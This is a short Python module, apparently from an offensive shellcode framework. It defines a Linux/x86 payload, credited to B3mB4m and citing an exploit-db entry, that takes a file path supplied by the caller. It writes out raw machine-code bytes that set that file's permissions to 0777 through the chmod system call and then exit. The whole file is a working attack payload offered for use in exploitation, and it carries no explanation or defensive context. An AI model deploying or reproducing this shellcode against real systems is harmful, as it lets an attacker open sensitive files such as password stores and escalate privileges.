from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "B3mB4m"
    Shellcode.info["name"] = "Linux/x86 - chmod shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com/exploits/37285/"
    ]

    def __init__(self, **kwargs): 
        Shellcode.info["size"] = 19 + Shellcode().getsize(kwargs["file"])
        Shellcode.info["payload"] = [
            r"\x31\xc0\x50"
            + kwargs["file"] +
            r"\xb0\x0f\x89\xe3\x66\xb9\xff"
            r"\x01\xcd\x80\x31\xc0\x40\xcd\x80"
        ]



